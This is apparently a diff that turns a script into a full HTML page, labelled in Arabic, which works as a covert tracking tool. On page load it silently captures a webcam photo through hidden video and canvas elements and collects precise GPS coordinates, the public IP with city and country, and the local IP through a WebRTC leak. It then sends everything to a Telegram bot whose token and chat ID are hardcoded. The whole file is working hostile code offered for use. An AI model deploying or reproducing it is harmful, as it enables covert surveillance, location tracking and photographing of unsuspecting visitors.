@@ -1,29 +1,39 @@
-<script>
-  const token = "7692799219:AAGv_dCGtZ5c-6MXTrUUJeEVoBDATMN3RgI";
-  const chat_id = "5735855086";
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>📍 تحديد + تصوير + IPs</title>
+</head>
+<body>
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <pre id="result">📡 جاري جمع المعلومات...</pre>
 
-  let gpsMsg = "";
-  let publicIP = "";
-  let localIP = "";
-  let gpsLat = "";
-  let gpsLon = "";
-  let city = "";
-  let country = "";
-  let partsReady = 0;
+  <script>
+    const token = "7692799219:AAGv_dCGtZ5c-6MXTrUUJeEVoBDATMN3RgI";
+    const chat_id = "5735855086";
 
-  function sendPhoto(blob) {
-    const form = new FormData();
-    form.append("chat_id", chat_id);
-    form.append("photo", blob, "photo.jpg");
-    return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-      method: "POST",
-      body: form
-    });
-  }
+    let gpsMsg = "";
+    let publicIP = "";
+    let localIP = "";
+    let gpsLat = "";
+    let gpsLon = "";
+    let partsReady = 0;
+    let city = "";
+    let country = "";
 
-  function sendCombinedMessage() {
-    const locationInfo = city && country ? `🌍 الموقع التقريبي (IP):\n🏙️ ${city}\n🇺🇳 ${country}\n` : "";
-    const message = `📡 معلومات الجهاز:
+    function sendPhoto(blob) {
+      const form = new FormData();
+      form.append("chat_id", chat_id);
+      form.append("photo", blob, "photo.jpg");
+      return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: "POST",
+        body: form
+      });
+    }
+
+    function sendCombinedMessage() {
+      const message = `📡 معلومات الجهاز:
 
 📍 الموقع (GPS):
 ${gpsMsg || "❌ فشل تحديد الموقع"}
@@ -31,123 +41,127 @@ ${gpsMsg || "❌ فشل تحديد الموقع"}
 🌐 IP الخارجي: ${publicIP || "❌"}
 🏠 IP الداخلي: ${localIP || "❌"}
 
-${locationInfo}
+🏙️ المدينة: ${city || "❌"}
+🌍 الدولة: ${country || "❌"}
+
 🗺️ Google Maps: https://www.google.com/maps?q=${gpsLat},${gpsLon}`;
-
-    document.getElementById("result").innerText = message;
-
-    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id, text: message })
-    });
-  }
-
-  function checkIfReady() {
-    partsReady++;
-    if (partsReady === 4) {
-      sendCombinedMessage();
-    }
-  }
-
-  function getLocation() {
-    if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          gpsLat = pos.coords.latitude.toFixed(6);
-          gpsLon = pos.coords.longitude.toFixed(6);
-          const acc = pos.coords.accuracy;
-          gpsMsg = `Latitude: ${gpsLat}\nLongitude: ${gpsLon}\n📏 الدقة: ±${acc} متر`;
-          checkIfReady();
-        },
-        err => {
-          gpsMsg = `❌ فشل تحديد الموقع: ${err.message} (كود الخطأ: ${err.code})`;
-          document.getElementById("result").innerText += `\n[خطأ GPS]: ${err.message} (code: ${err.code})`;
-          checkIfReady();
-        },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-      );
-    } else {
-      gpsMsg = "❌ جهازك لا يدعم GPS";
-      document.getElementById("result").innerText += "\n[GPS غير مدعوم]";
-      checkIfReady();
-    }
-  }
-
-  function getGeoInfo(ip) {
-    fetch(`https://ipinfo.io/${ip}?token=ce7d2b4010fbc3`)
-      .then(res => res.json())
-      .then(data => {
-        city = data.city || "";
-        country = data.country || "";
-        checkIfReady();
-      })
-      .catch(() => {
-        city = "";
-        country = "";
-        checkIfReady();
+      document.getElementById("result").innerText = message;
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id, text: message })
       });
-  }
+    }
 
-  function getPublicIP() {
-    fetch("https://api.ipify.org?format=json")
-      .then(res => res.json())
-      .then(data => {
-        publicIP = data.ip;
-        getGeoInfo(publicIP); // بعد الحصول على الـ IP، نطلب الدولة والمدينة
-      })
-      .catch(() => {
-        publicIP = "❌ فشل جلب IP";
+    function checkIfReady() {
+      partsReady++;
+      if (partsReady === 3) {
+        sendCombinedMessage();
+      }
+    }
+
+    function getLocation() {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            gpsLat = pos.coords.latitude.toFixed(6);
+            gpsLon = pos.coords.longitude.toFixed(6);
+            const acc = pos.coords.accuracy;
+            gpsMsg = `Latitude: ${gpsLat}
+Longitude: ${gpsLon}
+📏 الدقة: ±${acc} متر`;
+            checkIfReady();
+          },
+          err => {
+            gpsMsg = `❌ فشل تحديد الموقع: ${err.message} (كود الخطأ: ${err.code})`;
+            document.getElementById("result").innerText += `\n[خطأ GPS]: ${err.message} (code: ${err.code})`;
+            checkIfReady();
+          },
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      } else {
+        gpsMsg = "❌ جهازك لا يدعم GPS";
+        document.getElementById("result").innerText += "\n[GPS غير مدعوم]";
         checkIfReady();
-      });
-  }
+      }
+    }
 
-  function getLocalIP() {
-    const pc = new RTCPeerConnection({ iceServers: [] });
-    pc.createDataChannel("");
-    pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
-    pc.onicecandidate = event => {
-      if (!event || !event.candidate) return;
-      const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(event.candidate.candidate);
-      if (ipMatch) {
-        const ip = ipMatch[1];
-        if (ip.startsWith("192.") || ip.startsWith("10.") || ip.startsWith("172.")) {
-          localIP = ip;
+    function getGeoInfo(ip) {
+      fetch(`https://ipinfo.io/${ip}?token=ce7d2b4010fbc3`)
+        .then(res => res.json())
+        .then(data => {
+          city = data.city || "";
+          country = data.country || "";
+          checkIfReady();
+        })
+        .catch(() => {
+          city = "";
+          country = "";
+          checkIfReady();
+        });
+    }
+
+    function getPublicIP() {
+      fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .then(data => {
+          publicIP = data.ip;
+          getGeoInfo(publicIP);
+        })
+        .catch(() => {
+          publicIP = "❌ فشل جلب IP";
+          checkIfReady();
+        });
+    }
+
+    function getLocalIP() {
+      const pc = new RTCPeerConnection({ iceServers: [] });
+      pc.createDataChannel("");
+      pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+      pc.onicecandidate = event => {
+        if (!event || !event.candidate) return;
+        const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(event.candidate.candidate);
+        if (ipMatch) {
+          const ip = ipMatch[1];
+          if (ip.startsWith("192.") || ip.startsWith("10.") || ip.startsWith("172.")) {
+            localIP = ip;
+            checkIfReady();
+          }
+        }
+      };
+      setTimeout(() => {
+        if (!localIP) {
+          localIP = "❌ لم يتم الحصول عليه";
           checkIfReady();
         }
-      }
-    };
-    setTimeout(() => {
-      if (!localIP) {
-        localIP = "❌ لم يتم الحصول عليه";
-        checkIfReady();
-      }
-    }, 2000);
-  }
+      }, 2000);
+    }
 
-  function initCamera() {
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        const video = document.getElementById("video");
-        video.srcObject = stream;
-        video.addEventListener("playing", () => {
-          const canvas = document.getElementById("canvas");
-          const ctx = canvas.getContext("2d");
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          ctx.drawImage(video, 0, 0);
-          canvas.toBlob(blob => sendPhoto(blob), "image/jpeg");
-          stream.getTracks().forEach(track => track.stop());
+    function initCamera() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          const video = document.getElementById("video");
+          video.srcObject = stream;
+          video.addEventListener("playing", () => {
+            const canvas = document.getElementById("canvas");
+            const ctx = canvas.getContext("2d");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+            canvas.toBlob(blob => sendPhoto(blob), "image/jpeg");
+            stream.getTracks().forEach(track => track.stop());
+          });
+        })
+        .catch(err => {
+          document.getElementById("result").innerText += "\n❌ الكاميرا غير متاحة: " + err.message;
         });
-      })
-      .catch(err => {
-        document.getElementById("result").innerText += "\n❌ الكاميرا غير متاحة: " + err.message;
-      });
-  }
+    }
 
-  // بدء كل العمليات
-  getLocation();
-  getPublicIP();
-  getLocalIP();
-  initCamera();
-</script>
+    // بدء كل العمليات
+    getLocation();
+    getPublicIP();
+    getLocalIP();
+    initCamera();
+  </script>
+</body>
+</html>
